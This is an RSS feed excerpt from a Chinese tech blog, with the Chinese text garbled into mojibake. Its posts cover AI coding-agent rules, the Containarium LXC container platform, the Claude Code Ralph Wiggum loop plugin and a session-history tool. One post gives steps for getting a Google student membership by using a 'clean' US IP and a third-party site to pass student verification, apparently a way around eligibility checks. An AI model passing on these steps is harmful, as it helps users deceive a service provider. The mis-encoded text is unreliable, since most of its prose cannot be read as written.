&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- ç¤ºä¾‹ï¼š&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;### å®ç°ç”¨æˆ·ç™»å½•åŠŸèƒ½` è€Œé `### Implement User Login`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;### 4.2 ä»£ç æ³¨é‡Š&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- æ–°ä»£ç çš„æ³¨é‡Šå¿…é¡»ä½¿ç”¨**ä¸­æ–‡**
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- ä¿æŒæ³¨é‡Šç®€æ´æ˜äº†
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- ç¤ºä¾‹ï¼š&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;// æ£€æŸ¥ç”¨æˆ·æ˜¯å¦å·²ç™»å½•&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt; è€Œé &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;// Check &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; user is logged in&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;### 4.3 Git æäº¤ä¿¡æ¯&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- ä½¿ç”¨ä¸­æ–‡ï¼Œæ ¼å¼ï¼š&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&amp;lt;ç±»å‹&amp;gt;: &amp;lt;æè¿°&amp;gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- ç¤ºä¾‹ï¼š&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;feat: æ·»åŠ ç”¨æˆ·ç™»å½•åŠŸèƒ½&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;ã€&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;fix: ä¿®å¤ç§¯åˆ†è®¡ç®—é”™è¯¯&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;### 4.3 æ–‡æ¡£ç¼–å†™&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- æŠ€æœ¯æ–‡æ¡£ä½¿ç”¨ä¸­æ–‡
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- ä¿æŒ Markdown æ ¼å¼è§„èŒƒ
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;---
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;## äº”ã€å·¥ä½œæ¨¡å¼&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;### 5.1 å¤æ‚ä»»åŠ¡&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- å…ˆé˜…è¯»ç›¸å…³è§„èŒƒæ–‡æ¡£
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- åˆ¶å®šè®¡åˆ’åå†æ‰§è¡Œ
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- å®Œæˆåæ›´æ–°ç›¸å…³æ–‡æ¡£
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;### 5.2 ç®€å•ä»»åŠ¡&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- ç›´æ¥æ‰§è¡Œ
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- ä¿æŒä»£ç é£æ ¼ä¸€è‡´
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;### 5.3 ä¸ç¡®å®šæ—¶&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- ä¸»åŠ¨è¯¢é—®è€ŒéçŒœæµ‹
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- æä¾›é€‰é¡¹è®©ç”¨æˆ·å†³ç­–
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä»”ç»†çœ‹ä¸€ä¸‹ï¼Œæœç„¶æ˜¯GEMINI.md&lt;/p&gt;</description>
    </item>
    <item>
      <title>ä¸€ä¸ªè½»é‡çº§è¶…çº§çœé’±çš„lxcå¹³å°containarium</title>
      <link>https://rendoumi.com/posts/20260113-lxc_containarium/</link>
      <pubDate>Tue, 13 Jan 2026 09:00:01 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20260113-lxc_containarium/</guid>
      <description>&lt;p&gt;ç°åœ¨çš„çˆ±å¥½æ˜¯å¤©å¤©é€›github.comï¼Œé‡Œé¢çœŸçš„æ˜¯æœ‰éå¸¸å¤šçš„å¥½é¡¹ç›®&lt;/p&gt;
&lt;p&gt;å“ªä¸ªå¥½å°±cloneä¸‹æ¥ï¼Œè®©Cluade Codeæ¥åˆ†æåˆ†æ&lt;/p&gt;
&lt;p&gt;æ¨èä¸€ä¸ªå¥½çš„lxcå®¹å™¨å¹³å°&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://github.com/FootprintAI/Containarium
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¹‹æ‰€æœ‰è¯´å®ƒå¥½ï¼Œæ˜¯å› ä¸º10å¹´å‰ï¼Œåˆåˆ°å®å½“çš„æ—¶å€™ï¼Œå°±æ­äº†ä¸€å¥—LXCçš„å®¹å™¨å¹³å°ï¼Œé‚£æ—¶å€™Dockeræ‰æ–¹å…´æœªè‰¾ï¼ŒZFSå¥½åƒä¹Ÿæ‰åˆšèµ·æ­¥&lt;/p&gt;
&lt;p&gt;æ‰¾äº†ä¸‰å°ç‰¹åˆ«æ™®é€šçš„Dell R720 2UæœåŠ¡å™¨ï¼Œç„¶åæ­äº†LXCï¼Œä¸€å°ç‰©ç†æœºè™šæ‹Ÿ60å°lxcå®¹å™¨ï¼Œç„¶ååŒäº‹ä»¬ç”¨äº†å¤§æ¦‚6å¹´ï¼Œæ²¡æœ‰äººæ„è¯†åˆ°è¿™åªæ˜¯ä¸ªå®¹å™¨ï¼Œå¹¶éå®Œæ•´è™šæœºï¼Œä½†éƒ½å½“åšå®Œæ•´è™šæœºå†ä½¿ç”¨ï¼Œç›´åˆ°è¿è¡Œåˆ°ç¬¬6å¹´ï¼Œå¤§æ•°æ®çš„åŒäº‹åœ¨ä¸Šé¢è·‘äº†è‹¥å¹²elasticsearchï¼Œç„¶åå°±æ‹‰è·¨äº†ã€‚åŸå› æ˜¯ç”¨çš„äººè¿‡å¤šï¼Œè€Œesåˆè®¤ä¸ºæœ‰æœåŠ¡å™¨çš„ä¸€åŠå†…å­˜å¯ç”¨ï¼Œä¸€æ—¦çŒè¾“æ•°æ®ï¼Œå°±æŠŠæœåŠ¡å™¨æ‹–æ­»äº†ã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªé¡¹ç›®ä¹Ÿæ˜¯ç›¸åŒçš„æƒ³æ³•ï¼Œä¹Ÿç”¨lxcï¼Œç„¶åç”¨ZFSæ¥å½“å­˜å‚¨ï¼Œè¿™ä¸ªä¸»æ„å¾ˆç»å¦™&lt;/p&gt;
&lt;p&gt;å®Œæˆåº¦ç›¸å½“çš„é«˜ï¼Œç”¨terraformæ¥æ­å»ºåº•å±‚æ”¯æ’‘å¹³å°ã€‚&lt;/p&gt;
&lt;p&gt;çœ‹çœ‹claude codeçš„åˆ†æï¼š&lt;/p&gt;
&lt;p&gt;â— ç°åœ¨æˆ‘å·²ç»è·å¾—äº†è¶³å¤Ÿçš„ä¿¡æ¯æ¥è¿›è¡Œè¯¦ç»†åˆ†æã€‚è®©æˆ‘åŸºäºæ”¶é›†çš„ä¿¡æ¯ä¸ºæ‚¨æä¾›å…¨é¢çš„é¡¹ç›®å¯è¡Œæ€§è¯„ä¼°ã€‚&lt;/p&gt;
&lt;p&gt;Containarium é¡¹ç›®è¯¦ç»†åˆ†æä¸å¯è¡Œæ€§è¯„ä¼°&lt;/p&gt;
&lt;p&gt;ğŸ“‹ é¡¹ç›®æ¦‚è¿°&lt;/p&gt;
&lt;p&gt;Containarium æ˜¯ä¸€ä¸ªåŸºäº LXC ç³»ç»Ÿå®¹å™¨çš„å¤šç§Ÿæˆ·å¼€å‘ç¯å¢ƒå¹³å°,æ—¨åœ¨é€šè¿‡åœ¨å•ä¸ªäº‘è™šæ‹Ÿæœºä¸Šè¿è¡Œæ•°ç™¾ä¸ªéš”ç¦»çš„ Linux å¼€å‘ç¯å¢ƒ,å¤§å¹…é™ä½åŸºç¡€è®¾æ–½æˆæœ¬(å¯èŠ‚çœé«˜è¾¾92%)ã€‚&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;âœ… æ ¸å¿ƒä¼˜åŠ¿ä¸åˆ›æ–°ç‚¹&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;æˆæœ¬æ•ˆç›Šæé«˜&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;èµ„æºå¯†åº¦: ç›¸æ¯”ä¼ ç»Ÿ VM,æ¯ä¸ªå®¹å™¨ä»…æ¶ˆè€— 100-500MB RAM,å¯†åº¦æå‡ 10-50å€&lt;/li&gt;
&lt;li&gt;Spot å®ä¾‹: åˆ©ç”¨ GCP Spot å®ä¾‹å¯èŠ‚çœ 76% æˆæœ¬&lt;/li&gt;
&lt;li&gt;å®é™…æ•°å­—: 50 ç”¨æˆ·ä» $1,250/æœˆ é™è‡³ $98/æœˆ (92% èŠ‚çœ)&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;æŠ€æœ¯æ¶æ„æ‰å®&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;LXC vs Docker: é€‰æ‹©ç³»ç»Ÿå®¹å™¨(LXC)è€Œéåº”ç”¨å®¹å™¨,æ›´é€‚åˆå¤šç”¨æˆ·å¼€å‘ç¯å¢ƒ&lt;/li&gt;
&lt;li&gt;ZFS å­˜å‚¨: æ”¯æŒå‹ç¼©ã€é…é¢ã€å¿«ç…§,æ•°æ®åœ¨ Spot å®ä¾‹é‡å¯åå®Œå…¨ä¿ç•™&lt;/li&gt;
&lt;li&gt;å®‰å…¨å¤šç§Ÿæˆ·:
&lt;ul&gt;
&lt;li&gt;æ¯ä¸ªç”¨æˆ·ç‹¬ç«‹çš„ jump server è´¦æˆ·(proxy-only,æ—  shell è®¿é—®)&lt;/li&gt;
&lt;li&gt;unprivileged å®¹å™¨éš”ç¦»&lt;/li&gt;
&lt;li&gt;fail2ban + SSH å®¡è®¡æ—¥å¿—&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;å·¥ç¨‹è´¨é‡é«˜&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;ç±»å‹å®‰å…¨: ä½¿ç”¨ Protobuf/gRPC å®šä¹‰æ¥å£&lt;/li&gt;
&lt;li&gt;æµ‹è¯•å®Œå¤‡: åŒ…å«åŸºäº Terraform çš„ E2E æµ‹è¯•,éªŒè¯ ZFS æŒä¹…åŒ–&lt;/li&gt;
&lt;li&gt;æ–‡æ¡£å®Œå–„: README é•¿è¾¾ 2400+ è¡Œ,åŒ…å«è¯¦ç»†æ¶æ„å›¾ã€ä½¿ç”¨æŒ‡å—ã€FAQ&lt;/li&gt;
&lt;li&gt;ç”Ÿäº§å°±ç»ª: æ”¯æŒ mTLS è¿œç¨‹ç®¡ç†ã€æ°´å¹³æ‰©å±•ã€è´Ÿè½½å‡è¡¡&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;ğŸ¯ æŠ€æœ¯å¯è¡Œæ€§åˆ†æ&lt;/p&gt;</description>
    </item>
    <item>
      <title>Googleå­¦ç”Ÿå·çš„ç”³è¯·</title>
      <link>https://rendoumi.com/posts/20260113_google_pro/</link>
      <pubDate>Tue, 13 Jan 2026 09:00:00 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20260113_google_pro/</guid>
      <description>&lt;p&gt;Google å­¦ç”Ÿå·çš„ç”³è¯·ï¼Œå¤‡ä»½ä¸€ä¸‹ï¼Œçœçš„å¿˜è®°äº†ï¼š&lt;/p&gt;
&lt;p&gt;é¦–å…ˆå‰ææ˜¯è¦æœ‰ä¸€ä¸ªçº¯å‡€çš„ç¾å›½IPï¼Œå¯æ‰“å¼€ä¸‹é¢ç½‘å€å…ˆçœ‹çœ‹çº¯å‡€ä¸çº¯å‡€&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ping0.cc
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åæ‰“å¼€ç½‘é¡µçœ‹çœ‹æœ‰æ²¡æœ‰æƒé™&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://gemini.google.com/students
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åä¸è¦ä¹±ç‚¹ï¼Œä¸€å®šè¦å³é”®å¤åˆ¶é“¾æ¥&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260113113304335&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260113_google_pro/image-20260113113304335.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯å¥‡æ€ªçš„æ˜¯ï¼Œæˆ‘è¿™è¾¹ç›´æ¥ç‚¹äº†å°±è¿‡äº†ï¼Œä¹Ÿæ˜¯å¥‡è‘©&lt;/p&gt;
&lt;p&gt;å¦‚æœèƒ½Copyé“¾æ¥ï¼Œå°±æ‹·è´äº†&lt;/p&gt;
&lt;p&gt;ç„¶ååˆ°&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://batch.1key.me
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ‰“å¼€éªŒè¯é€šè¿‡&lt;/p&gt;
&lt;p&gt;ç„¶ååˆ·æ–°é¡µé¢ï¼Œç»‘å¡ï¼Œå°±OKäº†ã€‚&lt;/p&gt;
&lt;p&gt;ç„¶åå•Šï¼Œéœ€è¦æ‰“å¼€&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://aistudio.google.com/?authuser&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ‹¿åˆ°ç¼ºçœé¡¹ç›®çš„keyï¼Œç„¶å&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;GEMINI_API_KEY&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ä½ çš„API_KEY&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å°è¯•geminiç™»å½•ä¸€ä¸‹ï¼Œé—®é—®å®ƒæ˜¯ä»€ä¹ˆæ¨¡å‹&lt;/p&gt;
&lt;p&gt;æœ€ååˆ«å¿˜è®°åœ¨ä¸»å·é‡Œé¢ï¼Œç®¡ç†ä¼šå‘˜èµ„æ ¼ï¼Œç®¡ç†ä¼šå‘˜æ–¹æ¡ˆï¼Œæ‰“å¼€å…±äº«&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260113140511689&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260113_google_pro/image-20260113140511689.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å°±å¯ä»¥æ”¾å¿ƒçš„ç™»å½•antigravityäº†&lt;/p&gt;</description>
    </item>
    <item>
      <title>claude codeçš„Ralph Wiggumç¼–ç¨‹æ¨¡å¼å’ŒæŠ€å·§</title>
      <link>https://rendoumi.com/posts/20260112-claude_ralph_wiggum/</link>
      <pubDate>Mon, 12 Jan 2026 09:00:01 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20260112-claude_ralph_wiggum/</guid>
      <description>&lt;p&gt;æ‹‰å°”å¤«Â·ç»´å¤å§†ï¼ˆRalph Wiggumï¼‰ï¼šæ²¡å®Œæ²¡äº†çš„ Claude ä»£ç å¾ªç¯&lt;/p&gt;
&lt;p&gt;è¿™å…¶å®æ˜¯ä¸ªæ¢—ï¼š&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Ralph Wiggum&lt;/strong&gt; æ˜¯åŠ¨ç”»ç‰‡ã€Šè¾›æ™®æ£®ä¸€å®¶ã€‹ä¸­é‚£ä¸ªæ€»æ˜¯æä¸æ¸…çŠ¶å†µã€æ™ºå•†ä¸å¤ªåœ¨çº¿çš„å­©å­ã€‚ä»–æœ€è‘—åçš„æ¢—å›¾æ˜¯ &lt;strong&gt;&amp;ldquo;I&amp;rsquo;m helping&amp;rdquo;ï¼ˆæˆ‘åœ¨å¸®å¿™ï¼‰&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260112092557711&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260112-claude_ralph_wiggum/image-20260112092557711.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬åœ¨calude-codeæºä»£ç ä»“åº“ä¸­å¯ä»¥çœ‹åˆ°è¿™ä¸ªæ’ä»¶&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/anthropics/claude-code/tree/main/plugins/ralph-wiggum&#34;&gt;https://github.com/anthropics/claude-code/tree/main/plugins/ralph-wiggum&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;æ ¸å¿ƒæ¦‚å¿µï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# You run ONCE:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/ralph-loop &lt;span class=&#34;s2&#34;&gt;&amp;#34;Your task description&amp;#34;&lt;/span&gt; --completion-promise &lt;span class=&#34;s2&#34;&gt;&amp;#34;DONE&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Then Claude Code automatically:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 1. Works on the task&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 2. Tries to exit&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 3. Stop hook blocks exit&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 4. Stop hook feeds the SAME prompt back&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 5. Repeat until completion&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç¿»è¯‘ä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# æ‰§è¡Œå‘½ä»¤&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/ralph-loop &lt;span class=&#34;s2&#34;&gt;&amp;#34;Your task description&amp;#34;&lt;/span&gt; --completion-promise &lt;span class=&#34;s2&#34;&gt;&amp;#34;DONE&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# æ¥ä¸‹æ¥ Claude Code å°†è‡ªåŠ¨æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 1. å¤„ç†/æ‰§è¡Œè¯¥ä»»åŠ¡&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 2. å°è¯•é€€å‡ºç¨‹åº&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 3. â€œåœæ­¢æŒ‚é’©ï¼ˆStop hookï¼‰â€æ‹¦æˆªå¹¶é˜»æ­¢é€€å‡º&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 4. â€œåœæ­¢æŒ‚é’©â€å°†å®Œå…¨ç›¸åŒçš„æç¤ºè¯ï¼ˆpromptï¼‰é‡æ–°ä¼ å›ç»™ç³»ç»Ÿ&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 5. é‡å¤ä¸Šè¿°å¾ªç¯ï¼Œç›´åˆ°ä»»åŠ¡å®Œæˆï¼ˆå³å‡ºç° &amp;#34;DONE&amp;#34;ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¯´ç™½äº†å°±æ˜¯Claudeæ‰§è¡Œäº†ä¸€è½®åè¦é€€å‡ºï¼Œç„¶åæ‹‰å°”å¤«å°±è¹¦å‡ºæ¥é˜»æ­¢ï¼Œæ²¡å®Œï¼›å†è·‘ä¸€è½®ï¼Œåˆæƒ³é€€å‡ºï¼Œåˆè¢«é˜»æ­¢ï¼Œå¦‚æ­¤å¾€å¤ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>claude codeçš„sessionå†å²å›é¡¾å’Œç»§ç»­å·¥å…·</title>
      <link>https://rendoumi.com/posts/20260112-claude_history/</link>
      <pubDate>Mon, 12 Jan 2026 09:00:00 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20260112-claude_history/</guid>
      <description>&lt;p&gt;ç°åœ¨åŸºæœ¬Claude code å’Œ Codex å’Œ Gemini æ··ç”¨&lt;/p&gt;
&lt;p&gt;è¿ç»´æœ¬èº«çš„é¡¹ç›®ä¹Ÿä¸ä¼šæ€ä¹ˆå¤§&lt;/p&gt;
&lt;p&gt;ç”¨Claudeçš„æ—¶å€™ï¼Œå¼€äº†å¾ˆå¤šé¡¹ç›®å»å­¦ä¹ ã€ç ”ç©¶ï¼›é‚£å†å²å’Œåˆ‡å›æ¥ç»§ç»­ç ”ç©¶å°±å˜å¾—å¾ˆé‡è¦ï¼Œæ¯æ¬¡å¦‚æœéƒ½ä»å¤´å¼€å§‹åˆ†æï¼Œé‚£å´©æºƒäº†&lt;/p&gt;
&lt;p&gt;æ‰‹æ“äº†ä¸€ä¸ªå·¥å…·claude-historyï¼Œå¯ä»¥è§‚çœ‹å†å²ï¼Œå¹¶ä¸”ç”Ÿæˆå‘½ä»¤ï¼Œå¯ä»¥åœ¨ä»¥å‰çš„sessionåŸºç¡€ä¸Šç»§ç»­ç ”ç©¶&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://github.com/zhangrr/claude-history&#34;&gt;http://github.com/zhangrr/claude-history&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;çº¯ç”¨Goï¼Œå‰åç«¯ä¸€èµ·ï¼Œç›‘å¬ç«¯å£æ˜¯8888&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260112091316727&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260112-claude_history/image-20260112091316727.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;-ç‰¹æ€§&#34;&gt;âœ¨ ç‰¹æ€§&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;å•æ–‡ä»¶å®ç°&lt;/strong&gt;ï¼šæ‰€æœ‰åŠŸèƒ½é›†æˆåœ¨ &lt;code&gt;main.go&lt;/code&gt; ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼ˆçº¦ 900 è¡Œï¼‰&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;é›¶ä¾èµ–éƒ¨ç½²&lt;/strong&gt;ï¼šç¼–è¯‘åçš„äºŒè¿›åˆ¶æ–‡ä»¶åŒ…å«å‰ç«¯èµ„æºï¼Œæ— éœ€é¢å¤–æ–‡ä»¶&lt;/li&gt;
